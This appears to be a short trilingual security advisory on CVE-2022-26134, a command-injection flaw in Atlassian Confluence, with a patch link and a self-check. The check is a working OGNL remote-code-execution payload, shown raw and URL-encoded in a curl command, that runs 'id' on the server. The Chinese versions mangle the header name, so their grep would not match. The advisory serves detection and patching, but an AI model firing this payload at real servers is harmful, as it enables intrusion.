headline: Zero-Day Vulnerability in Atlassian Confluence
description:
On 2022-06-03, New zero-day Vulnerability occured. CVE-2022-26134 is one of command injection vulnerability. According to Report, a zero-day attack that began during the Memorial Day holiday in the United States and attacker could exploit this CVE-2022-26134 vulnerability to upload a webshell.

You can see full report on this blog https://blog.criminalip.io/2022/06/05/criminal-ip-analysis-report-on-zero-day-vulnerability-in-atlassian-confluence/ . EDIT: Patch out: https://www.atlassian.com/software/confluence/download-archives

If you are a Confluence user and you have access to Confluence through a browser on your PC, you can run the following command with a curl or python script to determine vulnerabilities of your Confluence server. Even if you are not an information security officer, there is a way to check vulnerabilities of your company’s Confluence. Try the following method and immediately request your security department for patches :

https://your_confluence_address/${(#result=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(“id”).getInputStream(),”utf-8″)).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader(“X-Cmd-Response”,#result))}/

If you change the part of your Confluence address, you can check it with curl as follows. If the uid, gid, and group of the Confluence server are displayed in the X-Cmd-Response header value, this server is considered to have CVE-2022-26134 vulnerability.

curl -v -k –head https://your_confluence_address/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/ | grep X-Cmd-Response
description_zh-Hans:
在2022-06-03，新的零日漏洞发生了。CVE-2022-26134是一个命令注入漏洞。根据报告，在美国阵亡将士纪念日假期期间开始的零日攻击，攻击者可以利用这个CVE-2022-26134漏洞上传webshell。

你可以在这个博客上看到完整的报告 https://blog.criminalip.io/2022/06/05/criminal-ip-analysis-report-on-zero-day-vulnerability-in-atlassian-confluence/ 。 编辑：补丁已出：https://www.atlassian.com/software/confluence/download-archives

如果你是Confluence的用户，并且可以通过PC上的浏览器访问Confluence，你可以用curl或python脚本运行以下命令来确定Confluence服务器的漏洞。即使你不是信息安全人员，也有办法检查你公司的Confluence的漏洞。试试下面的方法，并立即向你的安全部门申请补丁：

https://your_confluence_address/${(#result=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("id"). getInputStream(), "utf-8″)。(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader("X-Commd-Response",#result))}/

如果你改变了Confluence地址的部分，你可以用curl检查，如下所示。如果Confluence服务器的uid、gid和group显示在X-Commd-Response头值中，该服务器被认为有CVE-2022-26134漏洞。

curl -v -k -head https://your_confluence_address/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/ | grep X-Commd-Response
description_zh-Hant:
在2022-06-03，新的零日漏洞發生了。CVE-2022-26134是一個命令注入漏洞。根據報告，在美國陣亡將士紀念日假期期間開始的零日攻擊，攻擊者可以利用這個CVE-2022-26134漏洞上傳webshell。

你可以在這個博客上看到完整的報告 https://blog.criminalip.io/2022/06/05/criminal-ip-analysis-report-on-zero-day-vulnerability-in-atlassian-confluence/ 。 編輯：補丁已出：https://www.atlassian.com/software/confluence/download-archives

如果你是Confluence的用戶，並且可以通過PC上的瀏覽器訪問Confluence，你可以用curl或python腳本運行以下命令來確定Confluence服務器的漏洞。即使你不是信息安全人員，也有辦法檢查你公司的Confluence的漏洞。試試下面的方法，並立即向你的安全部門申請補丁：

https://your_confluence_address/${(#result=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("id"). getInputStream(), "utf-8″)。(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader("X-Commd-Response",#result))}/

如果你改變了Confluence地址的部分，你可以用curl檢查，如下所示。如果Confluence服務器的uid、gid和group顯示在X-Commd-Response頭值中，該服務器被認為有CVE-2022-26134漏洞。

curl -v -k -head https://your_confluence_address/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/ | grep X-Commd-Response
